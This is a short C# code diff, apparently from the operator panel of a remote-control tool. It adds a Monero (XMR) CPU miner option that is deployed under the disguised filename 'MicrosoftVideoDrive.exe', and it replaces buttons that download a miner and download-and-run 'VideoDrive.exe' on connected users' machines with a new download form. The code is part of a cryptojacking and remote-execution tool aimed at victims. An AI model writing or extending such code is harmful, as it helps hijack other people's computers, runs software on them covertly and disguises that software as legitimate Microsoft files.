@@ -59,6 +59,9 @@ namespace ServerWorker
                 case DDMiners.none:
                     user.UsersCom.SetMSettings(@"Standart\Miner", "Data", "MicrosoftVideoDrive.exe","",false,DDMiners.none);
                     break;
+                case DDMiners.XMR_CPU:
+                    user.UsersCom.SetMSettings(@"M\XMRCPU", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_CPU);
+                    break;
                 case DDMiners.XMR_N:
                     user.UsersCom.SetMSettings(@"M\XMRN", "Data", "MicrosoftVideoDrive.exe", "", true, DDMiners.XMR_N);
                     break;
@@ -147,11 +150,6 @@ namespace ServerWorker
             {
                 Log.Send("The process failed: " + e.ToString());
             }
-        }
-
-        private void button3_Click(object sender, EventArgs e)
-        {
-            user.UsersCom.DownloadF("Miner", "Data");
         }
 
         private void button4_Click_1(object sender, EventArgs e)
@@ -258,9 +256,10 @@ namespace ServerWorker
             user.UsersCom.StartChat();
         }
 
-        private void button7_Click(object sender, EventArgs e)
+        private void Button3_Click(object sender, EventArgs e)
         {
-            user.UsersCom.DownloadAndRun("VideoDrive.exe");
+            Download downloadForm = new Download(user);
+            downloadForm.Show();
         }
     }
 }
